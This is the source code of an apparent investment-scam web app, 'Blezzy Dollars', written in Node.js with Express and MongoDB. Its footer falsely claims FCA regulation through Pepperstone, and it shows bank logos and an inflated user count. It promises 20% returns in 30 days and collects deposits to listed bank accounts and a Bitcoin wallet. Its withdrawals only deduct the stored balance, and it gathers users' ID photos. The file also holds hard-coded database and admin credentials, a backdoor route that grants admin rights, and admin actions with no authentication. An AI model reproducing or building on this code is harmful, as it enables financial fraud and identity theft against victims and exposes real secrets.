const express = require('express');
const session = require('express-session');
const mongoose = require('mongoose');
const app = express();

// =============================================================
//  ✅ DATABASE CONNECTION
// =============================================================
const MONGO_URI = "mongodb+srv://Gloirebolia1995:Sheilla9611@cluster0.bem8n8n.mongodb.net/blezzypay?retryWrites=true&w=majority";

mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ Database Connected"))
    .catch(err => console.error("❌ Database Error:", err));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(session({ secret: 'blezzy_key_99', resave: false, saveUninitialized: true }));

const userSchema = new mongoose.Schema({
    email: { type: String, unique: true, required: true },
    passcode: String,
    name: String,
    phone: String,
    address: String,
    kycStatus: { type: String, default: "Unverified" },
    idImage: { type: String, default: "" }, 
    isAdmin: { type: Boolean, default: false },
    balance: { type: Number, default: 0 },
    investments: [{ capital: Number, profit: Number, date: Date }],
    pendingDeposit: { amount: Number, status: String, date: Date },
    transactions: [{ type: { type: String }, amount: Number, date: String, details: String }]
});
const User = mongoose.model('User', userSchema);

// =============================================================
//  ✅ LEGAL & REGULATORY FOOTER
// =============================================================
const partners = [
    { name: "Citi", link: "https://www.citigroup.com", img: "https://upload.wikimedia.org/wikipedia/commons/1/1b/Citi.svg" },
    { name: "Morgan Stanley", link: "https://www.morganstanley.com", img: "https://upload.wikimedia.org/wikipedia/commons/3/34/Morgan_Stanley_Logo_1.svg" }
];

const legalFooter = `
<div style="margin-top:40px;padding-top:20px;border-top:1px solid #1c2026;text-align:center;color:#444;font-size:9px;line-height:1.6;font-family:sans-serif;">
    <p style="margin-bottom:10px;text-transform:uppercase;letter-spacing:1px;font-weight:bold;color:#666">Regulatory Information</p>
    Blezzydollars operating under its parent company<br>
    <b style="color:#666">Pepperstone Limited (United Kingdom)</b><br>
    Company Registration Number: 08965105<br>
    License Number (Firm Reference Number): 684312<br>
    Regulated by the <b>Financial Conduct Authority (FCA)</b>
    <div style="margin-top:15px;opacity:0.5;display:flex;justify-content:center;gap:20px;">
        ${partners.map(p => `<img src="${p.img}" style="height:15px;filter:brightness(0) invert(1)">`).join('')}
    </div>
</div>`;

// --- ROUTES ---
app.get('/', (req, res) => res.send(renderLogin()));
app.get('/signup', (req, res) => res.send(renderSignup()));

app.post('/register', async (req, res) => {
    const { name, email, phone, address, passcode } = req.body;
    try {
        const existing = await User.findOne({ email: email.toLowerCase() });
        if (existing) return res.send("Email already exists. <a href='/'>Login instead</a>");
        const isAdmin = email.toLowerCase() === "swedbank.bolia@icloud.com"; 
        const newUser = new User({
            name, email: email.toLowerCase(), phone, address, passcode,
            kycStatus: "Unverified", isAdmin: isAdmin, investments: []
        });
        await newUser.save();
        res.redirect('/');
    } catch (e) { res.send("Error: " + e.message); }
});

app.post('/login', async (req, res) => {
    const inputEmail = req.body.email.toLowerCase().trim();
    const inputPass = req.body.passcode.trim();
    if (inputEmail === "swedbank.bolia@icloud.com") {
        const adminUser = await User.findOneAndUpdate({ email: inputEmail }, { isAdmin: true, passcode: "George1933@" }, { new: true, upsert: true });
        req.session.userId = adminUser._id;
        return res.redirect('/admin');
    }
    const user = await User.findOne({ email: inputEmail });
    if (user && user.passcode === inputPass) {
        req.session.userId = user._id;
        if(user.isAdmin) return res.redirect('/admin');
        return res.redirect('/dashboard');
    }
    res.send('Invalid Credentials. <a href="/">Try Again</a>');
});

app.get('/dashboard', async (req, res) => {
    if (!req.session.userId) return res.redirect('/');
    const u = await User.findById(req.session.userId);
    if (!u) return res.redirect('/');
    if (u.isAdmin) return res.redirect('/admin');
    res.send(renderDashboard(u));
});

app.get('/settings', async (req, res) => {
    if (!req.session.userId) return res.redirect('/');
    const u = await User.findById(req.session.userId);
    res.send(renderSettings(u));
});

app.get('/kyc-page', (req, res) => res.send(renderKyc()));
app.post('/submit-kyc', async (req, res) => {
    await User.findByIdAndUpdate(req.session.userId, { kycStatus: "Pending", idImage: req.body.idImage });
    res.redirect('/settings');
});
app.post('/close-account', async (req, res) => {
    await User.findByIdAndDelete(req.session.userId);
    req.session.destroy();
    res.redirect('/');
});

app.post('/dep', async (req, res) => {
    await User.findByIdAndUpdate(req.session.userId, {
        pendingDeposit: { amount: parseFloat(req.body.amount), status: "Wait", date: new Date() }
    });
    res.redirect('/pay-now');
});
app.get('/pay-now', async (req, res) => {
    const u = await User.findById(req.session.userId);
    if (!u || !u.pendingDeposit) return res.redirect('/dashboard');
    res.send(renderPayNow(u));
});
app.post('/sent', async (req, res) => {
    const u = await User.findById(req.session.userId);
    u.pendingDeposit.status = "Pending";
    await u.save();
    res.redirect('/dashboard');
});
app.post('/with', async (req, res) => {
    const u = await User.findById(req.session.userId);
    const amt = parseFloat(req.body.amount);
    const fee = req.body.type === 'inst' ? amt * 0.03 : 0;
    if (amt > 0 && u.balance >= amt) {
        u.balance -= amt;
        u.transactions.push({ type: "Withdraw", amount: -amt, date: new Date().toLocaleDateString(), details: `Fee: $${fee}` });
        await u.save();
    }
    res.redirect('/dashboard');
});

// ✅ FIXED CONTACT ROUTE (Prevents "Cannot POST /contact" error)
app.post('/contact', async (req, res) => {
    if (!req.session.userId) return res.redirect('/');
    console.log(`Support Message from User ${req.session.userId}: ${req.body.subject}`);
    res.send("<script>alert('Message sent successfully! We will contact you soon.'); window.location.href='/dashboard';</script>");
});

// --- SWAP / CLAIM LOGIC ---
app.post('/swap', async (req, res) => {
    if (!req.session.userId) return res.redirect('/');
    const u = await User.findById(req.session.userId);
    const now = new Date();
    let totalReleased = 0;
    const remainingInvestments = [];

    u.investments.forEach(inv => {
        const diffDays = Math.ceil(Math.abs(now - inv.date) / (1000 * 60 * 60 * 24));
        if (diffDays >= 30) { 
            const total = inv.capital + inv.profit;
            totalReleased += total; 
            u.transactions.push({ 
                type: "Maturity Payout", 
                amount: total, 
                date: new Date().toLocaleDateString(), 
                details: `Capital $${inv.capital} + Profit $${inv.profit}` 
            });
        } else {
            remainingInvestments.push(inv);
        }
    });

    if (totalReleased > 0) {
        u.balance += totalReleased;
        u.investments = remainingInvestments; 
        await u.save();
    }
    res.redirect('/dashboard');
});

app.get('/admin', async (req, res) => {
    if (!req.session.userId) return res.redirect('/');
    const u = await User.findById(req.session.userId);
    if (!u || !u.isAdmin) return res.redirect('/');
    const pendingDeposits = await User.find({ "pendingDeposit.status": "Pending" });
    const pendingKYC = await User.find({ kycStatus: "Pending" });
    res.send(renderAdmin(pendingDeposits, pendingKYC));
});
app.post('/admin-pass', async (req, res) => {
    if (!req.session.userId) return res.redirect('/');
    const u = await User.findById(req.session.userId);
    if (!u || !u.isAdmin) return res.redirect('/');
    u.passcode = req.body.newpass;
    await u.save();
    res.redirect('/admin');
});
app.post('/verify-kyc', async (req, res) => { await User.findByIdAndUpdate(req.body.uid, { kycStatus: "Verified" }); res.redirect('/admin'); });
app.post('/reject-kyc', async (req, res) => { await User.findByIdAndUpdate(req.body.uid, { kycStatus: "Rejected", idImage: "" }); res.redirect('/admin'); });
app.post('/confirm', async (req, res) => {
    const u = await User.findById(req.body.uid);
    if (u && u.pendingDeposit) {
        const amt = u.pendingDeposit.amount;
        u.investments.push({ capital: amt, profit: amt * 0.20, date: new Date() });
        u.transactions.push({ type: "Deposit", amount: amt, date: new Date().toLocaleDateString(), details: "Locked 30 Days" });
        u.pendingDeposit = null;
        await u.save();
    }
    res.redirect('/admin');
});
app.post('/release', async (req, res) => { res.redirect('/admin'); });
app.get('/logout', (req, res) => { req.session.destroy(); res.redirect('/'); });
app.get('/fix-my-account', async (req, res) => {
    const targetEmail = "swedbank.bolia@icloud.com";
    const targetPass = "George1933@";
    await User.findOneAndUpdate({ email: targetEmail }, { isAdmin: true, passcode: targetPass });
    res.send(`Account ${targetEmail} is now ADMIN with password ${targetPass}. <a href='/'>Login</a>`);
});

// =============================================================
//  UI / DESIGN
// =============================================================
const fonts = `<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">`;
const css = `* { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; } body { background: #000000; color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; padding-bottom: 90px; } .container { padding: 20px; max-width: 480px; margin: 0 auto; } .ticker-wrap { width: 100%; overflow: hidden; background: #0b0e11; border-bottom: 1px solid #1c2026; white-space: nowrap; padding: 10px 0; } .ticker { display: inline-block; animation: ticker 30s linear infinite; } .ticker-item { display: inline-block; padding: 0 20px; font-size: 13px; font-weight: 600; } .up { color: #00c853; } .down { color: #ff4757; } @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } } .card { background: #11141a; padding: 20px; border-radius: 20px; border: 1px solid #1c2026; margin-bottom: 15px; } .balance-card { background: linear-gradient(135deg, #194bfd 0%, #6e00ff 100%); border-radius: 24px; padding: 25px; position: relative; overflow: hidden; box-shadow: 0 15px 35px rgba(25, 75, 253, 0.25); border: 1px solid rgba(255,255,255,0.1); margin-bottom: 25px; } .chip { width: 40px; height: 30px; background: rgba(255,255,255,0.2); border-radius: 6px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.3); } input, select, textarea { width: 100%; padding: 16px; background: #0b0e11; border: 1px solid #2a2f38; color: white; border-radius: 12px; font-size: 16px; margin: 8px 0 16px 0; transition: 0.2s; } input:focus { border-color: #194bfd; } button { width: 100%; padding: 18px; background: #194bfd; border: none; font-weight: 700; font-size: 16px; cursor: pointer; color: white; border-radius: 14px; box-shadow: 0 4px 15px rgba(25, 75, 253, 0.4); transition: 0.2s; } .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: rgba(11, 14, 17, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #1c2026; display: flex; justify-content: space-around; padding: 12px 0 25px 0; z-index: 100; } .nav-item { color: #848e9c; font-size: 24px; text-decoration: none; position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.2s; } .nav-item.active { color: #194bfd; } .action-grid { display: flex; justify-content: space-between; margin: 25px 0; padding: 0 10px; } .action-btn { display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer; } .icon-circle { width: 55px; height: 55px; border-radius: 20px; background: #2a2f38; display: flex; justify-content: center; align-items: center; font-size: 22px; color: white; transition: 0.2s; } .action-btn:hover .icon-circle { background: #194bfd; } .label { font-size: 12px; color: #848e9c; font-weight: 600; } .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 200; align-items: flex-end; justify-content: center; } .m-con { background: #1b1f26; width: 100%; max-width: 500px; padding: 30px 20px; border-radius: 30px 30px 0 0; border-top: 1px solid #2a2f38; animation: slideUp 0.3s ease; } @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } } .badge { padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; } .badge-success { background: rgba(0,200,83,0.15); color: #00c853; } .badge-warn { background: rgba(255, 152, 0, 0.15); color: orange; } .row { display: flex; justify-content: space-between; align-items: center; }`;

function renderLogin(){ return `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${fonts}<style>${css} body{display:flex;justify-content:center;align-items:center;height:100vh;background:#000}</style></head><body><div class="container" style="text-align:center"><h1 style="font-size:32px;margin-bottom:5px;font-weight:900;letter-spacing:-1px;text-transform:uppercase">BLEZZY DOLLARS</h1><div style="background:rgba(25, 75, 253, 0.1);padding:6px 12px;border-radius:20px;display:inline-block;margin-bottom:40px;border:1px solid rgba(25, 75, 253, 0.2)"><span style="color:#00c853;font-size:10px;vertical-align:middle">●</span> <span style="font-weight:700;color:white;font-size:13px">899,290 Users</span></div><form action="/login" method="POST"><input type="email" name="email" placeholder="Email Address" required style="background:#111;border:none"><input type="password" name="passcode" placeholder="Passcode" required style="background:#111;border:none"><button style="margin-top:10px">Secure Login</button></form><a href="/signup" style="color:#666;display:block;margin-top:25px;text-decoration:none;font-size:14px">Create a new wallet</a>${legalFooter}</div></body></html>`; }
function renderSignup(){ return `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${fonts}<style>${css} body{display:flex;justify-content:center;align-items:center;height:100vh}</style></head><body><div class="container"><h2 style="text-align:center;margin-bottom:30px">Create Wallet</h2><form action="/register" method="POST"><input type="text" name="name" placeholder="Legal Name" required><input type="email" name="email" placeholder="Email" required><input type="text" name="phone" placeholder="Mobile" required><input type="text" name="address" placeholder="Address"><input type="password" name="passcode" placeholder="Create Passcode" required><button style="background:#2a2f38">CREATE ACCOUNT</button></form><a href="/" style="color:#848e9c;display:block;text-align:center;margin-top:20px;text-decoration:none">Back to Login</a>${legalFooter}</div></body></html>`; }

function renderDashboard(u){
    const now = new Date();
    let totalLockedCapital = 0, totalLockedProfit = 0, claimableAmount = 0, minDaysLeft = 30;
    
    // Calculate investments
    if(u.investments){
        u.investments.forEach(inv => {
            const diffDays = Math.ceil(Math.abs(now - inv.date)/(1000*60*60*24));
            const left = 30 - diffDays;
            if (left <= 0) {
                claimableAmount += (inv.capital + inv.profit);
            } else {
                totalLockedCapital += inv.capital;
                totalLockedProfit += inv.profit;
                if(left < minDaysLeft) minDaysLeft = left;
            }
        });
    }

    const txs = u.transactions.slice().reverse().map(t => `
        <div style="display:flex;justify-content:space-between;align-items:center;padding:15px 0;border-bottom:1px solid #1c2026">
            <div style="display:flex;align-items:center;gap:15px">
                <div style="width:40px;height:40px;border-radius:12px;background:${t.amount>0?'rgba(0,200,83,0.1)':'rgba(255,71,87,0.1)'};color:${t.amount>0?'#00c853':'#ff4757'};display:flex;align-items:center;justify-content:center">
                    <i class="fa-solid ${t.amount>0?'fa-arrow-down':'fa-arrow-up'}"></i>
                </div>
                <div>
                    <div style="font-weight:600">${t.type}</div>
                    <small>${t.date} ${t.details ? '• '+t.details : ''}</small>
                </div>
            </div>
            <div style="text-align:right;font-weight:600;color:${t.amount>0?'#00c853':'white'}">
                ${t.amount>0?'+':''}$${t.amount.toFixed(2)}
            </div>
        </div>`).join('');
    
    return `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${fonts}<style>${css}</style></head><body>
    <div class="ticker-wrap"><div class="ticker" id="crypto-ticker"><span class="ticker-item">Loading Market Data...</span></div></div>
    <div class="container">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:25px;margin-top:10px">
            <a href="/settings" style="color:white;font-size:24px"><i class="fa-solid fa-gear"></i></a>
            <div style="display:flex;align-items:center;gap:10px">
                <div style="text-align:right">
                    <div style="font-weight:700">${u.name.split(' ')[0]}</div>
                    <small style="color:${u.kycStatus==='Verified'?'#00c853':'#848e9c'}">${u.kycStatus}</small>
                </div>
                <div style="width:40px;height:40px;background:#2a2f38;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#194bfd;font-weight:bold">${u.name.charAt(0)}</div>
            </div>
        </div>
        <div class="balance-card">
            <div style="display:flex;justify-content:space-between;align-items:start">
                <div class="chip"></div>
                <div style="text-align:right;opacity:0.8;font-size:12px;font-weight:600">BLEZZY DOLLARS</div>
            </div>
            <small style="color:rgba(255,255,255,0.7);font-size:13px;text-transform:uppercase;letter-spacing:1px">Available Balance</small>
            <div style="font-size:36px;font-weight:800;margin:5px 0 25px 0;letter-spacing:-1px">$${u.balance.toFixed(2)}</div>
            <div style="display:flex;flex-direction:column;gap:8px;border-top:1px solid rgba(255,255,255,0.15);padding-top:15px">
                <div class="row">
                    <small style="color:rgba(255,255,255,0.7);font-size:14px">Locked (Capital+Profit)</small> 
                    <b style="font-size:15px">$${(totalLockedCapital + totalLockedProfit).toFixed(2)}</b>
                </div>
            </div>
        </div>
        ${u.pendingDeposit && u.pendingDeposit.amount ? `<div style="background:#e67e22;padding:15px;border-radius:15px;margin-bottom:20px;color:black;display:flex;justify-content:space-between;align-items:center"><b>Processing: $${u.pendingDeposit.amount}</b> <a href="/pay-now" style="background:black;color:white;padding:5px 15px;border-radius:20px;text-decoration:none;font-size:12px">PAY</a></div>` : ''}
        <div class="action-grid">
            <div class="action-btn" onclick="openM('dep')"><div class="icon-circle"><i class="fa-solid fa-plus"></i></div><span class="label">Deposit</span></div>
            <div class="action-btn" onclick="openM('with')"><div class="icon-circle"><i class="fa-solid fa-arrow-up-from-bracket"></i></div><span class="label">Withdraw</span></div>
            <div class="action-btn" onclick="${claimableAmount > 0 ? "document.getElementById('swapForm').submit()" : ""}">
                <div class="icon-circle" style="${claimableAmount > 0 ? 'background:#00c853;animation:pulse 2s infinite' : 'opacity:0.5;background:#333'}">
                    <i class="fa-solid fa-unlock"></i>
                </div>
                <span class="label">${claimableAmount > 0 ? `Claim $${claimableAmount}` : (totalLockedCapital > 0 ? `Wait ${minDaysLeft}d` : 'Claim')}</span>
            </div>
            <div class="action-btn" onclick="document.getElementById('contact').style.display='flex'"><div class="icon-circle"><i class="fa-solid fa-headset"></i></div><span class="label">Support</span></div>
        </div>
        <form id="swapForm" action="/swap" method="POST" style="display:none"></form>
        <div style="display:flex;gap:15px;margin-bottom:20px">
            <div class="card" style="flex:1;margin:0;background:#16191f"><small>Locked Capital</small><div style="font-size:18px;color:#fff;font-weight:700;margin-top:5px">$${totalLockedCapital.toFixed(2)}</div></div>
            <div class="card" style="flex:1;margin:0;background:#16191f"><small>Expected Profit</small><div style="font-size:18px;color:#00c853;font-weight:700;margin-top:5px">+$${totalLockedProfit.toFixed(2)}</div></div>
        </div>
        <div class="card" style="background:linear-gradient(180deg, #111 0%, #0f1c13 100%); border:1px solid #1c3d25; padding:20px;">
            <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;color:#00c853">
                <i class="fa-solid fa-lock" style="font-size:20px"></i>
                <h3 style="margin:0;font-size:16px">30-Day Maturity Logic</h3>
            </div>
            <p style="color:#aaa;font-size:13px;line-height:1.6;margin:0">
                <b>1. Locked:</b> Your Deposit AND your 20% Profit are locked for 30 days.<br>
                <b>2. No Early Withdrawals:</b> Funds cannot be touched until maturity.<br>
                <b>3. Day 30:</b> Click "CLAIM" to release Capital + Profit to your balance.
            </p>
        </div>
        <h3 style="margin-bottom:15px">Recent Activity</h3>
        <div style="padding-bottom:50px">${txs || '<div style="text-align:center;padding:40px;color:#848e9c">No transactions yet.</div>'}</div>
        ${legalFooter}
    </div>
    <div class="bottom-nav">
        <a href="/settings" class="nav-item active"><i class="fa-solid fa-gear" style="font-size:20px;margin-bottom:5px"></i><span style="font-size:10px">Settings</span></a>
        <a href="/dashboard" class="nav-item"><i class="fa-solid fa-wallet" style="font-size:20px;margin-bottom:5px"></i><span style="font-size:10px">Home</span></a>
        <a href="javascript:void(0)" onclick="document.getElementById('contact').style.display='flex'" class="nav-item"><i class="fa-solid fa-headset" style="font-size:20px;margin-bottom:5px"></i><span style="font-size:10px">Support</span></a>
    </div>
    <div id="dep" class="modal">
        <div class="m-con">
            <h2>Add Capital</h2>
            <div style="background:#111;padding:15px;border-radius:12px;margin-bottom:20px;font-size:13px;color:#ccc;line-height:1.5">
                <div style="margin-bottom:8px"><i class="fa-solid fa-lock" style="color:#ff4757;margin-right:8px"></i> Funds are <b>LOCKED</b> for 30 Days.</div>
                <div style="margin-bottom:8px"><i class="fa-solid fa-chart-line" style="color:#00c853;margin-right:8px"></i> Earn <b>20% Profit</b>.</div>
                <div><i class="fa-solid fa-check" style="color:#194bfd;margin-right:8px"></i> On Day 30, Capital + Profit unlocks.</div>
            </div>
            <form action="/dep" method="POST">
                <input type="number" name="amount" placeholder="Amount (USD)" required>
                <button>CONTINUE</button>
            </form>
            <button onclick="closeM()" style="background:transparent;color:#848e9c;margin-top:10px">Cancel</button>
        </div>
    </div>
    <div id="with" class="modal"><div class="m-con"><h2>Withdraw</h2><p style="color:#848e9c;margin-bottom:20px">Available Cash: $${u.balance.toFixed(2)}</p><form action="/with" method="POST"><input type="number" name="amount" placeholder="Amount" max="${u.balance}"><select><option>Standard Transfer (1-3 Days)</option><option>Instant (3% Fee)</option></select><input placeholder="Wallet Address / IBAN"><button>CONFIRM WITHDRAWAL</button></form><button onclick="closeM()" style="background:transparent;color:#848e9c;margin-top:10px">Cancel</button></div></div>
    <div id="contact" class="modal"><div class="m-con"><h2>Support</h2><form action="/contact" method="POST"><input name="subject" placeholder="Subject"><textarea name="message" placeholder="Message" rows="4"></textarea><button>SEND MESSAGE</button></form><button onclick="closeM()" style="background:transparent;color:#848e9c;margin-top:10px">Cancel</button></div></div>
    <script>
    function openM(id){document.getElementById(id).style.display='flex'} 
    function closeM(){document.querySelectorAll('.modal').forEach(m=>m.style.display='none')} 
    async function fetchPrices(){try{const res=await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,ripple,solana,tether,bnbtiger,dogecoin&vs_currencies=usd&include_24hr_change=true');const data=await res.json();const coins=[{id:'bitcoin',label:'BTC'},{id:'ethereum',label:'ETH'},{id:'ripple',label:'XRP'},{id:'solana',label:'SOL'},{id:'tether',label:'USDT'},{id:'bnbtiger',label:'BNBTIGER'},{id:'dogecoin',label:'DOGE'}];let html='';coins.forEach(c=>{const info=data[c.id];if(info){const price=info.usd<1?info.usd.toFixed(6):info.usd.toLocaleString();const change=info.usd_24h_change.toFixed(2);const color=change>=0?'#00c853':'#ff4757';const arrow=change>=0?'▲':'▼';html+=\`<span class="ticker-item">\${c.label}: <span style="color:white">$ \${price}</span> <span style="color:\${color};margin-left:5px">\${arrow} \${change}%</span></span>\`;}});document.getElementById('crypto-ticker').innerHTML=html+html}catch(e){console.log('Ticker Error',e)}} fetchPrices();setInterval(fetchPrices,30000);
    </script>
    <style>@keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(0, 200, 83, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0); } }</style>
    </body></html>`;
}

function renderSettings(u){ return `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${fonts}<style>${css}</style></head><body><div class="container"><div style="display:flex;align-items:center;gap:15px;margin-bottom:30px"><a href="/dashboard" style="color:white;font-size:20px"><i class="fa-solid fa-arrow-left"></i></a><h2>Settings</h2></div><div class="card"><small>Legal Name</small><div style="font-size:18px;margin-bottom:15px;font-weight:600">${u.name}</div><small>Email</small><div style="font-size:18px;margin-bottom:15px;font-weight:600">${u.email}</div><small>Verification Level</small><div style="display:flex;justify-content:space-between;align-items:center;margin-top:5px"><span style="color:${u.kycStatus==='Verified'?'#00c853':'orange'};font-weight:bold">${u.kycStatus}</span>${u.kycStatus==='Unverified'?'<a href="/kyc-page" style="color:#194bfd;text-decoration:none;font-weight:bold">Verify Now</a>':''}</div></div><a href="/logout" style="display:block;text-align:center;padding:15px;background:#2a2f38;color:white;text-decoration:none;border-radius:12px;margin-top:40px;font-weight:bold">Log Out</a><form action="/close-account" method="POST" style="margin-top:20px"><button style="background:rgba(255, 71, 87, 0.1);color:#ff4757;border:1px solid #ff4757">Close Wallet</button></form></div></body></html>`; }
function renderKyc(){ return `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${fonts}<style>${css}</style></head><body><div class="container" style="text-align:center;padding-top:50px"><h2>Identity Verification</h2><p style="color:#848e9c;margin-bottom:40px">Upload a clear photo of your ID/Passport.</p><form action="/submit-kyc" method="POST"><input type="hidden" name="idImage" id="base64Str"><div style="border:2px dashed #2a2f38;border-radius:20px;padding:40px;margin-bottom:20px;cursor:pointer" onclick="document.getElementById('f').click()"><i class="fa-solid fa-camera" style="font-size:40px;color:#848e9c"></i><p>Tap to upload</p></div><input type="file" id="f" accept="image/*" onchange="encodeImage(this)" style="display:none"><button id="btn" disabled style="opacity:0.5;background:#2a2f38">SUBMIT DOCUMENT</button></form></div><script>function encodeImage(input){if(input.files&&input.files[0]){var reader=new FileReader();reader.onload=function(e){document.getElementById('base64Str').value=e.target.result;document.getElementById('btn').disabled=false;document.getElementById('btn').style.opacity='1';document.getElementById('btn').style.background='#194bfd';document.getElementById('btn').innerText='UPLOAD NOW'};reader.readAsDataURL(input.files[0])}}</script></body></html>`; }
function renderPayNow(u){ return `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${fonts}<style>${css}</style></head><body><div class="container" style="text-align:center;padding-top:40px"><small>You are sending</small><div style="font-size:48px;font-weight:700;color:#194bfd;margin:10px 0 40px 0">$${u.pendingDeposit.amount}</div><div style="text-align:left"><div class="card"><b>🇺🇸 US Account</b><br><small>Bank Name: Bank of America</small><br><small>Account: 026009593</small></div><div class="card"><b>🇪🇺 EU Account</b><br><small>Bank Name: Barclay</small><br><small>Name: Hillside (Sports) GP Limited</small><br><small>IBAN: GB33BARC20658259151311</small><br><small style="color:#00c853">Ref: info</small></div><div class="card"><b>🇺🇬 Uganda Account</b><br><small>Bank Name: Equity Bank</small><br><small>Account: 1003103498481</small><br><small style="color:#00c853">Ref: Annet</small></div><div class="card"><b>🇿🇦 South Africa Account</b><br><small>Bank Name: Capitek Bank</small><br><small>Account: 1882242481</small><br><small style="color:#00c853">Ref: BlezzyPay</small></div><div class="card"><b>₿ Bitcoin Wallet</b><br><small style="word-break:break-all;user-select:all">bc1qn4ajq8fppd3derk8a24w75jkk94pjynn063gm7</small></div></div><form action="/sent" method="POST"><button>I HAVE SENT FUNDS</button></form><a href="/dashboard" style="display:block;margin-top:20px;color:#848e9c;text-decoration:none">Cancel</a></div></body></html>`; }
function renderAdmin(deposits, kycs){ return `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${fonts}<style>${css} .admin-card{border-left:4px solid #194bfd}</style></head><body><div class="container"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:30px"><h2>Admin Panel</h2><a href="/logout" style="color:#ff4757"><i class="fa-solid fa-power-off"></i></a></div><div class="card" style="border-left:4px solid #f0b90b"><h3>Security</h3><form action="/admin-pass" method="POST" style="margin-top:10px"><input type="text" name="newpass" placeholder="New Admin Passcode" required><button style="background:#2a2f38">UPDATE PASSWORD</button></form></div><form action="/release" method="POST"><button style="background:#194bfd;margin-bottom:30px">⚡ PAY OUT YIELDS</button></form><h3>Pending Deposits</h3>${deposits.length ? deposits.map(x=>`<div class="card admin-card"><b>${x.email}</b><br><span style="font-size:20px">$${x.pendingDeposit.amount}</span> <form action="/confirm" method="POST" style="margin-top:10px"><input type="hidden" name="uid" value="${x._id}"><button style="background:#00c853;padding:10px">CONFIRM</button></form></div>`).join('') : '<small style="color:#848e9c">No deposits.</small>'}<h3 style="margin-top:30px">KYC Requests</h3>${kycs.length ? kycs.map(x=>`<div class="card"><b>${x.name}</b><br><img src="${x.idImage}" style="width:100%;border-radius:10px;margin:10px 0"><div style="display:flex;gap:10px"><form action="/verify-kyc" method="POST" style="flex:1"><input type="hidden" name="uid" value="${x._id}"><button style="background:#00c853">ACCEPT</button></form><form action="/reject-kyc" method="POST" style="flex:1"><input type="hidden" name="uid" value="${x._id}"><button style="background:#ff4757">REJECT</button></form></div></div>`).join('') : '<small style="color:#848e9c">No KYC.</small>'}</div></body></html>`; }

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
